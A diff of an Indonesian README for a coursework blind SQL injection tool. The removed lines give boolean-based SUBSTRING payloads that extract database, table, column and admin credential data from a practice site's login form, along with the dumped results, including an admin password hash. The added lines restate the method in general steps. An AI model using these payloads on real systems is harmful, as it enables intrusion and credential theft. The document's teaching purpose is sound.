@@ -1,43 +1,19 @@
+## Blind SQL Injection Database Dumper
 
-## Blind SQL Injection
+### Deskripsi
+Proyek ini adalah hasil praktikum keamanan sistem informasi yang menunjukkan bagaimana teknik **Blind SQL Injection** dapat digunakan untuk mengekstrak data dari form login yang rentan.
 
-Tools ini dibuat menggunakan bahasa Python untuk melakukan Blind SQL Injection terhadap website *langitan* yang diberikan.  
-Tools ini melakukan brute-force terhadap setiap karakter dari hasil query SQL, memanfaatkan response dari server untuk mengetahui apakah tebakan karakter benar atau salah.
+### Tujuan
+Mendemonstrasikan metode pengambilan data dari database menggunakan karakter per karakter, meskipun tidak ada respon langsung dari server terhadap kueri SQL.
 
-### Library yang Digunakan:
-- `requests` untuk melakukan HTTP request
-- `sys` untuk output karakter satu per satu ke console
-- `urllib3`, `os`, `time` untuk mendukung pengiriman request dan pengelolaan sistem
+### Tools yang Digunakan
+- Python 3.x
+- `requests`, `urllib3`, dan modul standar lainnya
+- Server dengan endpoint rentan SQLi
 
----
-
-## Teknik SQL Injection
-
-- **Jenis:** Blind SQL Injection (Boolean-based)  
-- **Metode:** Menggunakan `BINARY SUBSTRING` untuk mengekstrak informasi satu karakter per satu karakter.
-
-### Contoh Payload:
-
-- **Database:**  
-  `'admin' AND BINARY SUBSTRING(DATABASE(), {i}, 1) = '{chr(c)}' -- -`
-
-- **Tabel:**  
-  `'admin' AND BINARY SUBSTRING((SELECT group_concat(table_name) FROM information_schema.tables WHERE table_schema='db_larangan'), {i}, 1) = '{chr(c)}' -- -`
-
-- **Kolom:**  
-  `'admin' AND BINARY SUBSTRING((SELECT group_concat(column_name) FROM information_schema.columns WHERE table_schema='db_larangan' AND table_name='admin'), {i}, 1) = '{chr(c)}' -- -`
-
-- **Data:**  
-  `'admin' AND BINARY SUBSTRING((SELECT group_concat(username, ':', password) FROM admin), {i}, 1) = '{chr(c)}' -- -`
-
----
-
-## Hasil yang Diperoleh
-
-- **Nama Database:** `db_larangan`
-- **Nama Tabel:**  
-  `admin, agenda, album, alumni, berita, galeri, guru, kategori_link, kelas, link, mapel, materi, pengumuman, profil, siswa, siswa_kelas`
-- **Kolom Tabel admin:**  
-  `id_admin, username, password`
-- **Data pada Tabel admin:**  
-  `admin:21232f297a57a5a743894a0e4a801fc3`
+### Cara Kerja
+1. Menyisipkan payload injeksi ke parameter login (`user`).
+2. Menebak isi database karakter demi karakter menggunakan fungsi `substring()`.
+3. Mengecek hasil berdasarkan `status_code == 302` sebagai indikator data benar.
+4. Menyusun struktur database (nama tabel, kolom, isi baris).
+5. Menyimpan hasil ke dalam file `.sql`.
